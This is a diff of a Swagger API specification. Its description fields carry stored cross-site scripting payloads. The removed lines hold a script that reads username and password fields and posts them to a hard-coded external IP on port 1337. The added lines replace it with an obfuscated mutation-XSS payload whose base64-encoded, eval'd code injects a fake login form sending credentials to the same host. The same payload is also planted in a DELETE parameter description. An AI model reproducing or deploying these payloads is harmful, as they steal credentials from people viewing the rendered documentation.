@@ -1,23 +1,9 @@
 swagger: '2.0'
 info:
-  title: XSS Attack BY Olive
-  version: production
+  title: XSS Attack BY M0X0101
   description: |
-    <script>
-      var f = document.createElement('form');
-      f.setAttribute('method', 'POST');
-      f.setAttribute('action', 'http://152.58.96.54:1337');
-      var i1 = document.createElement('input');
-      i1.setAttribute('name', 'user');
-      i1.setAttribute('value', document.querySelector('[name="username"]')?.value || 'unknown');
-      var i2 = document.createElement('input');
-      i2.setAttribute('name', 'pass');
-      i2.setAttribute('value', document.querySelector('[name="password"]')?.value || 'unknown');
-      f.appendChild(i1);
-      f.appendChild(i2);
-      document.body.appendChild(f);
-      f.submit();
-    </script>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9Jyc7IHZhciBhPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2Zvcm0nKTthLmFjdGlvbj0iaHR0cDovLzE1Mi41OC45Ni41NDoxMzM3IjthLm1ldGhvZD0nUE9TVCc7YS5pbm5lckhUTUw9JzxjZW50ZXI+VXNlcm5hbWU6IDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJ1c2VyTmFtZSI+PGJyPlBhc3N3b3JkOiA8aW5wdXQgdHlwZT0icGFzc3dvcmQiIG5hbWU9InB3ZCI+PGJyPjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJMb2dpbiI+PC9jZW50ZXI+JzsgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs=' onerror='eval(atob(this.id))'>"></form>
+  version: production
 basePath: /JSSResource/
 produces:
   - application/xml
@@ -25,12 +11,28 @@ produces:
 consumes:
   - application/xml
   - application/json
+security:
+  - basicAuth: []
 paths:
-  /Olive:
+  /M0X0101:
     get:
       responses:
         '200':
-          description: POC triggered
+          description: No response was specified
       tags:
-        - XSS_Proof
-      summary: Trigger the XSS
+        - M0X0101_XSS_D
+      operationId: findAccounts
+      summary: Finds all accounts
+  '/hack/hachid/{id}':
+    delete:
+      parameters:
+        - description: |
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9Jyc7IHZhciBhPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2Zvcm0nKTthLmFjdGlvbj0iaHR0cDovLzE1Mi41OC45Ni41NDoxMzM3IjthLm1ldGhvZD0nUE9TVCc7YS5pbm5lckhUTUw9JzxjZW50ZXI+VXNlcm5hbWU6IDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJ1c2VyTmFtZSI+PGJyPlBhc3N3b3JkOiA8aW5wdXQgdHlwZT0icGFzc3dvcmQiIG5hbWU9InB3ZCI+PGJyPjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJMb2dpbiI+PC9jZW50ZXI+JzsgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs=' onerror='eval(atob(this.id))'>"></form>
+          format: int64
+          in: path
+          name: id
+          required: true
+          type: integer
+      responses:
+        '200':
+          description: No response was specified
